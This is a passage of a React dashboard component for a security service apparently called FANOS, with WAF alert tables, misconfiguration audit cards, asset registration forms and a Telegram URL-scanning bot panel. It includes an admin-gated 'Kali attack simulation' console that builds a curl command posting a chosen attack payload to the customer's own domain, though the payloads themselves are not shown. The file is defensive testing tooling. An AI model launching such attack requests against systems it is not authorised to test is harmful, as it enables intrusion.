                    contentStyle={{ backgroundColor: '#0f172a', borderColor: '#334155', borderRadius: '12px', fontSize: '11px' }}
                  />
                  <Legend verticalAlign="bottom" height={36} wrapperStyle={{ fontSize: '10px' }} />
                </PieChart>
              </ResponsiveContainer>
            </div>
          </div>
        </div>
      )}

      {/* ── Telegram Notification Alert Banner (when triggered by attack or scan) ── */}
      {telegramAlert && (
        <div className="p-4 rounded-2xl bg-gradient-to-r from-sky-950/90 to-blue-950/90 border border-sky-400/40 shadow-2xl flex items-start justify-between gap-4 animate-fade-in">
          <div className="flex items-start gap-3">
            <div className="w-9 h-9 rounded-xl bg-sky-500/20 text-sky-400 border border-sky-500/40 flex items-center justify-center flex-shrink-0">
              <Send size={18} />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="text-xs font-bold text-white uppercase tracking-wider">{telegramAlert.title}</span>
                <span className="text-[10px] font-mono px-2 py-0.2 rounded-full bg-sky-500/20 text-sky-300 border border-sky-500/30">
                  {telegramAlert.timestamp}
                </span>
              </div>
              <p className="text-xs text-sky-200 mt-1">{telegramAlert.message}</p>
            </div>
          </div>
          <button onClick={() => setTelegramAlert(null)} className="text-slate-400 hover:text-white text-sm">×</button>
        </div>
      )}

      {/* ── 2-Column Grid: Kali Attack Simulation Console + Telegram Security Bot ── */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Kali Linux Penetration Testing & Attack Simulation (7 cols) */}
        <div className="lg:col-span-7 bg-[#0b1526] border border-white/[0.08] hover:border-cyan-500/30 rounded-2xl p-6 shadow-xl space-y-4">
          <div className="flex items-center justify-between border-b border-white/[0.06] pb-3 flex-wrap gap-2">
            <div className="flex items-center gap-2.5">
              <div className="w-8 h-8 rounded-lg bg-rose-500/15 border border-rose-500/30 flex items-center justify-center text-rose-400">
                <Terminal size={17} />
              </div>
              <div>
                <h3 className="text-sm font-bold text-white flex items-center gap-2">
                  <span>Kali Linux Penetration Testing & Attack Simulation</span>
                  <span className="text-[9px] font-mono font-bold px-2 py-0.2 rounded bg-rose-500/15 text-rose-300 border border-rose-500/30">
                    Adversary Probing
                  </span>
                </h3>
                <p className="text-[11px] text-slate-400">
                  Simulate real-world attacks to verify WAF blocking and live alert generation for your assets.
                </p>
              </div>
            </div>

            {/* Approval badge for Kali testing */}
            {isApproved ? (
              <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[10px] font-bold bg-emerald-500/15 border border-emerald-500/30 text-emerald-400">
                <CheckCircle2 size={11} />
                <span>Authorized for Kali Testing</span>
              </span>
            ) : (
              <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[10px] font-bold bg-amber-500/15 border border-amber-500/30 text-amber-400">
                <Lock size={11} />
                <span>Admin Approval Required</span>
              </span>
            )}
          </div>

          {/* Attack Payload Selection */}
          <div className="space-y-2">
            <label className="text-[11px] font-semibold text-slate-300 flex items-center justify-between">
              <span>Select Attack Vector / Adversary Payload:</span>
              <span className="text-[10px] text-cyan-400 font-mono">Target: https://{frontendDomain}</span>
            </label>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
              {KALI_ATTACK_OPTIONS.map((atk) => {
                const isSelected = selectedAttack === atk.id
                const isReqApproved = activeCustomer.approvedServices.some(s =>
                  s.toLowerCase() === atk.requiredService.toLowerCase() ||
                  (atk.requiredService === 'waf' && s.includes('waf')) ||
                  (atk.requiredService === 'ids' && s.includes('ids')) ||
                  (atk.requiredService === 'url-detection' && s.includes('url'))
                )

                return (
                  <button
                    key={atk.id}
                    type="button"
                    onClick={() => setSelectedAttack(atk.id)}
                    className={`p-2.5 rounded-xl border text-left transition-all cursor-pointer ${
                      isSelected
                        ? 'bg-cyan-500/15 border-cyan-500/50 shadow-md ring-1 ring-cyan-500/30'
                        : 'bg-black/30 border-white/[0.06] hover:border-white/[0.12]'
                    }`}
                  >
                    <div className="flex items-center justify-between text-[11px] font-bold">
                      <span className={isSelected ? 'text-cyan-300' : 'text-white'}>{atk.name}</span>
                      <span className={`text-[8px] font-mono px-1.5 py-0.2 rounded border ${
                        isReqApproved
                          ? 'bg-emerald-500/15 text-emerald-400 border-emerald-500/30'
                          : 'bg-amber-500/15 text-amber-400 border-amber-500/30'
                      }`}>
                        {isReqApproved ? 'Ready' : 'Pending Approval'}
                      </span>
                    </div>
                    <div className="text-[10px] text-slate-400 mt-1 line-clamp-1 font-mono">
                      {atk.tool}
                    </div>
                  </button>
                )
              })}
            </div>
          </div>

          {/* Active Payload Terminal Inspection Box */}
          {(() => {
            const currentAtk = KALI_ATTACK_OPTIONS.find(a => a.id === selectedAttack) || KALI_ATTACK_OPTIONS[0]
            const isReqApproved = activeCustomer.approvedServices.some(s =>
              s.toLowerCase() === currentAtk.requiredService.toLowerCase() ||
              (currentAtk.requiredService === 'waf' && s.includes('waf')) ||
              (currentAtk.requiredService === 'ids' && s.includes('ids')) ||
              (currentAtk.requiredService === 'url-detection' && s.includes('url'))
            )

            return (
              <div className="rounded-xl bg-slate-950 p-3.5 border border-white/[0.08] space-y-2 font-mono text-[11px]">
                <div className="flex items-center justify-between text-slate-400 border-b border-white/[0.06] pb-2 text-[10px]">
                  <div className="flex items-center gap-1.5 text-slate-300">
                    <span className="w-2 h-2 rounded-full bg-rose-500 inline-block" />
                    <span>Kali Terminal Payload Preview</span>
                  </div>
                  <span className="text-cyan-400">{currentAtk.tool}</span>
                </div>

                <div className="text-slate-300 break-all">
                  <span className="text-rose-400 font-bold">kali@fanos-box:~$ </span>
                  curl -i -X POST -d &quot;payload={currentAtk.payload}&quot; https://{frontendDomain}{currentAtk.endpoint}
                </div>

                <div className="pt-2 flex items-center justify-between flex-wrap gap-2 text-[10px]">
                  <span className="text-slate-400">
                    Expected Defense: <span className="text-emerald-400 font-bold">{currentAtk.action}</span>
                  </span>

                  <button
                    type="button"
                    disabled={simulatingKali}
                    onClick={handleExecuteKaliAttack}
                    className={`flex items-center gap-1.5 px-4 py-2 rounded-xl font-sans font-bold text-xs transition cursor-pointer shadow-lg disabled:opacity-50 ${
                      isReqApproved
                        ? 'bg-gradient-to-r from-rose-500 to-amber-500 hover:brightness-110 text-white'
                        : 'bg-amber-500/20 border border-amber-500/40 text-amber-300 hover:bg-amber-500/30'
                    }`}
                  >
                    {simulatingKali ? (
                      <>
                        <RefreshCw size={13} className="animate-spin" />
                        <span>Transmitting Kali Attack...</span>
                      </>
                    ) : isReqApproved ? (
                      <>
                        <Play size={13} />
                        <span>Launch Simulated Kali Attack</span>
                      </>
                    ) : (
                      <>
                        <Lock size={13} />
                        <span>Admin Approval Required to Test</span>
                      </>
                    )}
                  </button>
                </div>

                {/* Execution log terminal output */}
                {kaliLogs.length > 0 && (
                  <div className="mt-2 pt-2 border-t border-white/[0.06] space-y-0.5 text-[10px] text-emerald-400/90 animate-fade-in">
                    {kaliLogs.map((log, idx) => (
                      <div key={idx}>{log}</div>
                    ))}
                  </div>
                )}
              </div>
            )
          })()}
        </div>

        {/* Telegram Security Bot Integration & Live Scanner (5 cols) */}
        <div className="lg:col-span-5 bg-[#0b1526] border border-white/[0.08] hover:border-sky-500/30 rounded-2xl p-6 shadow-xl space-y-4 flex flex-col justify-between">
          <div className="space-y-3">
            <div className="flex items-center justify-between border-b border-white/[0.06] pb-3">
              <div className="flex items-center gap-2.5">
                <div className="w-8 h-8 rounded-lg bg-sky-500/15 border border-sky-500/30 flex items-center justify-center text-sky-400">
                  <Send size={16} />
                </div>
                <div>
                  <h3 className="text-sm font-bold text-white flex items-center gap-1.5">
                    <span>Telegram Security Bot</span>
                    <span className="text-[10px] font-mono font-bold text-sky-400">@FanosUrlScanBot</span>
                  </h3>
                  <p className="text-[11px] text-slate-400">
                    Live AI Malicious URL Detection & Real-Time Alerts on Telegram
                  </p>
                </div>
              </div>

              <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[9px] font-bold bg-sky-500/15 text-sky-300 border border-sky-500/30">
                <span className="w-1.5 h-1.5 rounded-full bg-sky-400 animate-pulse" />
                Webhook Active
              </span>
            </div>

            <p className="text-xs text-slate-300 leading-relaxed">
              Use <strong>@FanosUrlScanBot</strong> to check URLs directly from Telegram. Instant XGBoost machine learning classification classifies links into Benign, Phishing, Malware, or Defacement.
            </p>

            {/* Bot Commands */}
            <div className="grid grid-cols-2 gap-2 text-[10px] font-mono">
              <div className="bg-black/30 p-2 rounded-lg border border-white/[0.05]">
                <span className="text-sky-400 font-bold">/scan &lt;url&gt;</span>
                <p className="text-slate-400 mt-0.5">Scan link with 99.8% AI model</p>
              </div>
              <div className="bg-black/30 p-2 rounded-lg border border-white/[0.05]">
                <span className="text-emerald-400 font-bold">/alerts</span>
                <p className="text-slate-400 mt-0.5">Stream blocked WAF incidents</p>
              </div>
            </div>

            {/* Quick Test URL via Telegram Bot */}
            <div className="space-y-1.5 pt-1">
              <label className="text-[11px] font-semibold text-slate-300">
                Test URL Scan via @FanosUrlScanBot:
              </label>
              <div className="flex gap-2">
                <input
                  type="text"
                  value={telegramInputUrl}
                  onChange={(e) => setTelegramInputUrl(e.target.value)}
                  placeholder="Enter link to test (e.g. http://phish-login.net)"
                  className="flex-1 px-3 py-1.5 rounded-xl bg-slate-900 border border-white/[0.1] text-xs text-white font-mono focus:border-sky-400 outline-none"
                />
                <button
                  type="button"
                  disabled={telegramTesting}
                  onClick={handleTelegramTestUrl}
                  className="px-3 py-1.5 rounded-xl text-xs font-bold bg-sky-500 hover:bg-sky-400 text-slate-950 transition cursor-pointer flex items-center gap-1 flex-shrink-0"
                >
                  {telegramTesting ? <RefreshCw size={12} className="animate-spin" /> : <Send size={12} />}
                  <span>Scan</span>
                </button>
              </div>
            </div>

            {/* Simulated Telegram Bot Response Bubble */}
            {telegramResult && (
              <div className="rounded-xl bg-slate-900/90 border border-sky-500/30 p-3 space-y-1.5 text-xs animate-fade-in">
                <div className="flex items-center justify-between text-[10px]">
                  <span className="font-bold text-sky-400 flex items-center gap-1">
                    <Send size={10} />
                    <span>Telegram Bot Response</span>
                  </span>
                  <span className="text-rose-400 font-mono font-bold bg-rose-500/15 px-1.5 py-0.2 rounded border border-rose-500/30">
                    {telegramResult.verdict}
                  </span>
                </div>
                <div className="text-[11px] font-mono text-cyan-300 truncate">
                  Target: {telegramResult.url}
                </div>
                <p className="text-[11px] text-slate-300">
                  {telegramResult.message}
                </p>
              </div>
            )}
          </div>

          <div className="pt-3 border-t border-white/[0.06] flex items-center justify-between text-xs">
            <span className="text-[11px] text-slate-400">Direct Bot Link:</span>
            <a
              href="https://t.me/FanosUrlScanBot"
              target="_blank"
              rel="noreferrer"
              className="inline-flex items-center gap-1 text-sky-400 hover:text-sky-300 font-semibold"
            >
              <span>Open in Telegram</span>
              <ExternalLink size={12} />
            </a>
          </div>
        </div>
      </div>

      {/* ── Live Security Events & Alerts Feed (The Core Requirement) ── */}
      <div className="bg-[#0b1526] border border-white/[0.08] rounded-2xl p-6 shadow-xl space-y-4">

        <div className="flex items-center justify-between flex-wrap gap-3 border-b border-white/[0.06] pb-3">
          <div>
            <div className="flex items-center gap-2">
              <Bell size={18} className="text-cyan-400" />
              <h2 className="text-base font-bold text-white">
                Live Security Events & Attack Alerts
              </h2>
            </div>
            <p className="text-xs text-slate-400 mt-0.5">
              Real-time attack telemetry and WAF blocking events strictly scoped to your registered domains.
            </p>
          </div>

          <div className="flex items-center gap-2">
            <span className="text-[10px] font-mono px-2.5 py-1 rounded-full bg-cyan-500/10 text-cyan-300 border border-cyan-500/30">
              Target: {frontendDomain}
            </span>
          </div>
        </div>

        {isApproved ? (
          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs border-collapse">
              <thead>
                <tr className="border-b border-white/[0.08] text-slate-400 font-semibold uppercase text-[10px]">
                  <th className="py-3 px-3">Timestamp</th>
                  <th className="py-3 px-3">Severity</th>
                  <th className="py-3 px-3">Attack Type</th>
                  <th className="py-3 px-3">Target URL</th>
                  <th className="py-3 px-3">Source IP</th>
                  <th className="py-3 px-3">Action</th>
                  <th className="py-3 px-3 text-right">AI Confidence</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-white/[0.04]">
                {(telemetry?.events || []).map((ev) => {
                  const isCrit = ev.severity === 'CRITICAL'
                  const isHigh = ev.severity === 'HIGH'

                  return (
                    <tr key={ev.id} className="hover:bg-white/[0.02] transition-colors">
                      <td className="py-3 px-3 font-mono text-[11px] text-slate-400 whitespace-nowrap">
                        {ev.timestamp}
                      </td>
                      <td className="py-3 px-3">
                        <span className={`px-2 py-0.5 rounded text-[10px] font-bold border ${
                          isCrit
                            ? 'bg-rose-500/15 border-rose-500/30 text-rose-400'
                            : isHigh
                            ? 'bg-amber-500/15 border-amber-500/30 text-amber-400'
                            : 'bg-cyan-500/15 border-cyan-500/30 text-cyan-400'
                        }`}>
                          {ev.severity}
                        </span>
                      </td>
                      <td className="py-3 px-3 font-bold text-white">
                        {ev.attack_type}
                      </td>
                      <td className="py-3 px-3 font-mono text-[11px] text-cyan-300 max-w-xs truncate" title={ev.target}>
                        {ev.target}
                      </td>
                      <td className="py-3 px-3 font-mono text-slate-300 whitespace-nowrap">
                        {ev.source_ip}
                      </td>
                      <td className="py-3 px-3">
                        <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-emerald-500/15 border border-emerald-500/30 text-emerald-300">
                          {ev.action}
                        </span>
                      </td>
                      <td className="py-3 px-3 text-right font-mono text-cyan-400 font-bold">
                        {ev.ai_confidence}%
                      </td>
                    </tr>
                  )
                })}
              </tbody>
            </table>
          </div>
        ) : (
          <div className="py-12 text-center max-w-md mx-auto space-y-3">
            <div className="w-12 h-12 rounded-2xl bg-amber-500/10 border border-amber-500/30 text-amber-400 flex items-center justify-center mx-auto">
              <Lock size={22} />
            </div>
            <h3 className="text-sm font-bold text-white">
              {hasPending ? 'Alerts Inactive: Request Pending Review' : 'No Security Services Active'}
            </h3>
            <p className="text-xs text-slate-400 leading-relaxed">
              {hasPending
                ? 'Your service request is currently pending review by an administrator. Live attack alerts and WAF blocking will stream into this feed as soon as your domain is approved.'
                : 'To activate real-time threat detection and WAF telemetry for your web applications, submit a service request.'}
            </p>
            {!hasPending && (
              <button
                onClick={() => navigate('/request-service')}
                className="mt-2 px-4 py-2 rounded-xl text-xs font-bold bg-cyan-500 text-slate-950 hover:bg-cyan-400 transition"
              >
                Request Service Now
              </button>
            )}
          </div>
        )}
      </div>

      {/* ── Security Misconfigurations & Posture Section (Customer Isolated) ──── */}
      <div className="bg-[#0b1526] border border-white/[0.08] rounded-2xl p-6 shadow-xl space-y-4">
        <div className="flex items-center justify-between border-b border-white/[0.06] pb-3 flex-wrap gap-2">
          <div>
            <h2 className="text-base font-bold text-white flex items-center gap-2">
              <ShieldAlert size={18} className="text-amber-400" />
              <span>Security Misconfigurations & Posture Audit</span>
              <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-cyan-500/10 text-cyan-300 border border-cyan-500/20">
                Customer Isolated Scope
              </span>
            </h2>
            <p className="text-xs text-slate-400 mt-0.5">
              Automated configuration audit strictly scoped to your registered enterprise assets (<span className="text-cyan-300 font-mono">https://{frontendDomain}</span>). Only visible to your account.
            </p>
          </div>
          <div className="flex items-center gap-2">
            <span className="text-xs text-slate-400 font-semibold">Defense Status:</span>
            <span className={`text-xs font-bold px-2.5 py-0.5 rounded ${
              isApproved
                ? 'bg-emerald-500/15 text-emerald-400 border border-emerald-500/30'
                : 'bg-amber-500/15 text-amber-400 border border-amber-500/30'
            }`}>
              {isApproved ? 'WAF Active Enforcement' : 'Audit Mode (Pending Approval)'}
            </span>
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-3.5">
          {(telemetry?.misconfigurations && telemetry.misconfigurations.length > 0 ? telemetry.misconfigurations : [
            {
              id: 'MISCFG-01',
              title: 'Missing Content-Security-Policy (CSP) Header',
              severity: 'MEDIUM',
              cwe: 'CWE-1021',
              target: `https://${frontendDomain}`,
              description: 'HTTP response headers do not restrict sources for scripts, styles, or iframes, leaving portal susceptible to Cross-Site Scripting (XSS).',
              remediation: 'Inject Content-Security-Policy: default-src \'self\' via FANOS WAF reverse proxy header rewrite.',
              status: isApproved ? 'MITIGATED' : 'OPEN',
              cvss: 5.4,
            },
            {
              id: 'MISCFG-02',
              title: 'Permissive CORS Origin Reflection Misconfiguration',
              severity: 'HIGH',
              cwe: 'CWE-942',
              target: `https://${frontendDomain}/api/v1/auth`,
              description: 'Origin header is dynamically reflected in Access-Control-Allow-Origin with credentials, creating cross-origin session leak vulnerabilities.',
              remediation: 'Enforce strict origin allowlists in application gateway middleware.',
              status: 'OPEN',
              cvss: 7.5,
            },
            {
              id: 'MISCFG-03',
              title: 'Server Version Banner Disclosure (Server Tokens)',
              severity: 'LOW',
              cwe: 'CWE-200',
              target: `https://${frontendDomain}`,
              description: 'Server advertises specific web daemon and version details, facilitating targeted vulnerability probing by adversaries.',
              remediation: 'Strip Server and X-Powered-By response headers using FANOS WAF header filter.',
              status: isApproved ? 'MITIGATED' : 'OPEN',
              cvss: 3.8,
            },
            {
              id: 'MISCFG-04',
              title: 'Missing HTTP Strict Transport Security (HSTS)',
              severity: 'HIGH',
              cwe: 'CWE-319',
              target: `https://${frontendDomain}`,
              description: 'HSTS header is absent, allowing attackers on adjacent network taps to downgrade HTTPS connections to plaintext HTTP (SSL stripping).',
              remediation: 'Configure Strict-Transport-Security: max-age=31536000; includeSubDomains; preload in WAF policy.',
              status: isApproved ? 'MITIGATED' : 'OPEN',
              cvss: 7.4,
            },
          ]).map((m: any) => {
            const isMitigated = m.status === 'MITIGATED'
            const isHigh = m.severity === 'HIGH' || m.severity === 'CRITICAL'
            return (
              <div
                key={m.id}
                className="bg-black/25 p-4 rounded-xl border border-white/[0.06] hover:border-white/[0.12] transition space-y-2.5"
              >
                <div className="flex items-start justify-between gap-2 flex-wrap">
                  <div className="flex items-center gap-2">
                    <span className={`text-[9px] font-bold px-2 py-0.5 rounded tracking-wider ${
                      isHigh
                        ? 'bg-rose-500/15 text-rose-400 border border-rose-500/30'
                        : 'bg-amber-500/15 text-amber-400 border border-amber-500/30'
                    }`}>
                      {m.severity}
                    </span>
                    <span className="text-[10px] font-mono text-slate-400 font-semibold">{m.cwe}</span>
                    <h4 className="text-xs font-bold text-white">{m.title}</h4>
                  </div>
                  <span className={`text-[9px] font-bold px-2 py-0.5 rounded ${
                    isMitigated
                      ? 'bg-emerald-500/15 text-emerald-400 border border-emerald-500/30'
                      : 'bg-rose-500/15 text-rose-400 border border-rose-500/30'
                  }`}>
                    {isMitigated ? 'MITIGATED BY WAF' : 'ACTION REQUIRED'}
                  </span>
                </div>

                <p className="text-[11px] text-slate-300 leading-relaxed">
                  {m.description}
                </p>

                <div className="text-[10px] bg-white/[0.03] p-2.5 rounded-lg border border-white/[0.05] space-y-1">
                  <div className="flex items-center gap-1.5 text-cyan-300 font-mono">
                    <Globe size={11} />
                    <span className="font-semibold">Target:</span>
                    <span>{m.target}</span>
                  </div>
                  <div className="text-slate-400">
                    <strong className="text-slate-300 font-semibold">Remediation: </strong>
                    {m.remediation}
                  </div>
                </div>
              </div>
            )
          })}
        </div>
      </div>

      {/* ── My Registered Assets Section ───────────────────── */}
      <div className="bg-[#0b1526] border border-white/[0.08] rounded-2xl p-6 shadow-xl space-y-4">
        <div className="flex items-center justify-between border-b border-white/[0.06] pb-3">
          <div>
            <h2 className="text-base font-bold text-white flex items-center gap-2">
              <Server size={18} className="text-cyan-400" />
              <span>My Registered Assets & Protection Scopes</span>
            </h2>
            <p className="text-xs text-slate-400 mt-0.5">
              Enterprise frontend domains and backend origins monitored by FANOS AI.
            </p>
          </div>
          <button
            onClick={() => setOpenAssetModal(true)}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold bg-cyan-500/15 border border-cyan-500/30 text-cyan-300 hover:bg-cyan-500/25 transition cursor-pointer"
          >
            <Plus size={13} />
            <span>Add Asset</span>
          </button>
        </div>

        {assets.length > 0 ? (
          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs border-collapse">
              <thead>
                <tr className="border-b border-white/[0.08] text-slate-400 font-semibold uppercase text-[10px]">
                  <th className="py-2.5 px-3">Asset Name</th>
                  <th className="py-2.5 px-3">Service</th>
                  <th className="py-2.5 px-3">Frontend Domain</th>
                  <th className="py-2.5 px-3">Backend Origin</th>
                  <th className="py-2.5 px-3">Environment</th>
                  <th className="py-2.5 px-3 text-right">Defense Status</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-white/[0.04]">
                {assets.map((asset) => (
                  <tr key={asset.id} className="hover:bg-white/[0.02] transition-colors">
                    <td className="py-3 px-3 font-bold text-white">
                      {asset.name}
                    </td>
                    <td className="py-3 px-3 text-cyan-300 font-medium">
                      {asset.service_type || 'WAF'}
                    </td>
                    <td className="py-3 px-3 font-mono text-[11px] text-slate-300">
                      {asset.target_url || asset.hostname || '—'}
                    </td>
                    <td className="py-3 px-3 font-mono text-[11px] text-slate-400">
                      {asset.ip_address}
                    </td>
                    <td className="py-3 px-3">
                      <span className="px-2 py-0.5 rounded text-[10px] font-mono bg-slate-900 border border-slate-700 text-slate-300">
                        {asset.environment}
                      </span>
                    </td>
                    <td className="py-3 px-3 text-right">
                      {isApproved ? (
                        <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-emerald-500/15 border border-emerald-500/30 text-emerald-400">
                          Active & Monitored
                        </span>
                      ) : (
                        <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-amber-500/15 border border-amber-500/30 text-amber-400">
                          Pending Review
                        </span>
                      )}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        ) : (
          <div className="py-8 text-center text-xs text-slate-400">
            <p>No assets registered yet.</p>
            <button
              onClick={() => navigate('/request-service')}
              className="mt-2 text-cyan-400 font-semibold hover:underline inline-flex items-center gap-1"
            >
              <span>Request service to register your first domain</span>
              <ArrowRight size={12} />
            </button>
          </div>
        )}
      </div>

      {/* ── Security Services Catalog Cards ─────────────────── */}
      <div className="space-y-4">
        <div className="flex items-center justify-between">
          <div>
            <h2 className="text-xl font-bold text-white tracking-tight">Security Services</h2>
            <p className="text-xs text-slate-400 mt-0.5">
              Each security service has a dedicated page and requires asset registration and administrator approval.
            </p>
          </div>
        </div>

        {/* 5 Security Service Cards */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
          {SECURITY_SERVICES.map((srv) => {
            const Icon = srv.icon
            const effStatus = getServiceEffectiveStatus(srv.id)
            const isServiceApproved = effStatus === 'APPROVED'
            const isPending = effStatus === 'PENDING'
            const isRejected = effStatus === 'REJECTED'

            let buttonLabel = `Request ${srv.shortName}`
            let targetRoute = `/customer/services/${srv.id}/request`

            if (isServiceApproved) {
              buttonLabel = `Open ${srv.shortName} Dashboard`
              targetRoute = srv.route
            } else if (isPending) {
              buttonLabel = 'View Request Status'
              targetRoute = `/customer/services/${srv.id}/request`
            } else if (isRejected) {
              buttonLabel = 'Submit Updated Request'
              targetRoute = `/customer/services/${srv.id}/request`
            }

            return (
              <div
                key={srv.id}
                className="bg-[#0b1526]/90 border border-white/[0.08] hover:border-cyan-500/40 rounded-2xl p-6 flex flex-col justify-between transition-all duration-200 shadow-xl relative overflow-hidden group hover:translate-y-[-2px]"
              >
                <div
                  className="absolute top-0 right-0 w-32 h-32 opacity-15 rounded-full blur-2xl pointer-events-none transition-opacity group-hover:opacity-30"
                  style={{ background: srv.accentColor }}
                />

                <div>
                  <div className="flex items-start justify-between gap-3 mb-4">
                    <div
                      className="w-12 h-12 rounded-xl flex items-center justify-center shadow-lg transition-transform group-hover:scale-105"
                      style={{
                        background: `${srv.accentColor}18`,
                        color: srv.accentColor,
                        border: `1px solid ${srv.accentColor}35`,
                      }}
                    >
                      <Icon size={24} />
                    </div>

                    <div className="flex flex-col items-end gap-1">
                      {getStatusBadge(srv.id)}
                      <span className="text-[10px] font-mono text-slate-500">
                        {srv.badgeText}
                      </span>
                    </div>
                  </div>

                  <h3 className="text-base font-bold text-white group-hover:text-cyan-300 transition-colors">
                    {srv.title}
                  </h3>

                  <p className="text-xs text-slate-400 mt-2 leading-relaxed">
                    {srv.description}
                  </p>
                </div>

                <div className="mt-6 pt-4 border-t border-white/[0.06] flex items-center justify-between">
                  <span className="text-[11px] text-slate-500">
                    {isServiceApproved ? 'Authorized Access' : isPending ? 'Pending Approval' : 'Gated Authorization'}
                  </span>

                  <button
                    onClick={() => navigate(targetRoute)}
                    className="flex items-center gap-1.5 px-3.5 py-1.5 rounded-xl text-xs font-bold transition-all cursor-pointer shadow-md"
                    style={{
                      background: isServiceApproved ? `${srv.accentColor}25` : 'rgba(255,255,255,0.08)',
                      color: isServiceApproved ? srv.accentColor : '#f1f5f9',
                      border: isServiceApproved ? `1px solid ${srv.accentColor}50` : '1px solid rgba(255,255,255,0.15)',
                    }}
                  >
                    <span>{buttonLabel}</span>
                    <ArrowRight size={13} />
                  </button>
                </div>
              </div>
            )
          })}
        </div>
      </div>

      {/* ── Asset Registration Modal ───────────────────────── */}
      {openAssetModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm animate-fade-in">
          <div className="bg-[#0b1526] border border-cyan-500/30 rounded-3xl p-6 sm:p-8 max-w-lg w-full shadow-2xl relative">
            <button
              onClick={() => setOpenAssetModal(false)}
              className="absolute top-5 right-5 text-slate-400 hover:text-white text-lg font-bold"
            >
              ×
            </button>

            <div className="flex items-center gap-3 mb-5">
              <div className="w-10 h-10 rounded-xl bg-cyan-500/15 border border-cyan-500/30 text-cyan-400 flex items-center justify-center">
                <Server size={20} />
              </div>
              <div>
                <h3 className="text-lg font-bold text-white">Register Target Asset</h3>
                <p className="text-xs text-slate-400">Add a website, API, or network for security protection</p>
              </div>
            </div>

            <form onSubmit={handleCreateAsset} className="space-y-4 text-xs">
              <div>
                <label className="block text-slate-300 font-semibold mb-1">Asset Name *</label>
                <input
                  type="text"
                  required
                  value={assetForm.name}
                  onChange={e => setAssetForm(p => ({ ...p, name: e.target.value }))}
                  placeholder="e.g. Corporate Banking Portal"
                  className="w-full px-3.5 py-2.5 rounded-xl bg-slate-900 border border-white/[0.1] text-white focus:border-cyan-400 outline-none"
                />
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block text-slate-300 font-semibold mb-1">Asset Type</label>
                  <select
                    value={assetForm.assetType}
                    onChange={e => setAssetForm(p => ({ ...p, assetType: e.target.value }))}
                    className="w-full px-3 py-2.5 rounded-xl bg-slate-900 border border-white/[0.1] text-white focus:border-cyan-400 outline-none"
                  >
                    <option value="WEBSITE">Website (WAF)</option>
                    <option value="API">API Gateway</option>
                    <option value="NETWORK">Network Subnet (IDS)</option>
                    <option value="SERVER">Server / Host</option>
                  </select>
                </div>

                <div>
                  <label className="block text-slate-300 font-semibold mb-1">Environment</label>
                  <select
                    value={assetForm.environment}
                    onChange={e => setAssetForm(p => ({ ...p, environment: e.target.value }))}
                    className="w-full px-3 py-2.5 rounded-xl bg-slate-900 border border-white/[0.1] text-white focus:border-cyan-400 outline-none"
                  >
                    <option value="PRODUCTION">PRODUCTION</option>
                    <option value="STAGING">STAGING</option>
                    <option value="DEVELOPMENT">DEVELOPMENT</option>
                  </select>
                </div>
              </div>

              <div>
                <label className="block text-slate-300 font-semibold mb-1">
                  Backend / Target IP Address *
                </label>
                <input
                  type="text"
                  required
                  value={assetForm.ipAddress}
                  onChange={e => setAssetForm(p => ({ ...p, ipAddress: e.target.value }))}
                  placeholder="192.168.1.100 or https://api-origin.com"
                  className="w-full px-3.5 py-2.5 rounded-xl bg-slate-900 border border-white/[0.1] text-white focus:border-cyan-400 outline-none font-mono"
                />
              </div>

              <div>
                <label className="block text-slate-300 font-semibold mb-1">
                  Frontend Domain / Hostname
                </label>
                <input
                  type="text"
                  value={assetForm.hostname}
                  onChange={e => setAssetForm(p => ({ ...p, hostname: e.target.value }))}
                  placeholder="secure.company.com"
                  className="w-full px-3.5 py-2.5 rounded-xl bg-slate-900 border border-white/[0.1] text-white focus:border-cyan-400 outline-none font-mono"
                />
              </div>

              <div>
                <label className="block text-slate-300 font-semibold mb-1">
                  Full Website / Target URL
                </label>
                <input
                  type="url"
                  value={assetForm.targetUrl}
                  onChange={e => setAssetForm(p => ({ ...p, targetUrl: e.target.value }))}
                  placeholder="https://secure.company.com"
                  className="w-full px-3.5 py-2.5 rounded-xl bg-slate-900 border border-white/[0.1] text-white focus:border-cyan-400 outline-none font-mono"
                />
              </div>

              <div className="pt-3 flex items-center justify-end gap-3">
                <button
                  type="button"
                  onClick={() => setOpenAssetModal(false)}
                  className="px-4 py-2 rounded-xl text-slate-400 hover:text-white"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  disabled={submittingAsset}
                  className="px-5 py-2.5 rounded-xl font-bold bg-cyan-500 hover:bg-cyan-400 text-slate-950 transition cursor-pointer disabled:opacity-50"
                >
                  {submittingAsset ? 'Registering...' : 'Register Asset'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* ── Quick Multi-Service Request Modal (Azanaww / Customer -> Admin Approvals Flow) ── */}
      {openServiceReqModal && (

        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/75 backdrop-blur-sm animate-fade-in">
          <div className="bg-[#0b1526] border border-cyan-500/30 rounded-3xl p-6 sm:p-8 max-w-lg w-full shadow-2xl relative">
            <button
              onClick={() => setOpenServiceReqModal(false)}
              className="absolute top-5 right-5 text-slate-400 hover:text-white text-lg font-bold"
            >
              ×
            </button>

            <div className="flex items-center gap-3 mb-5">
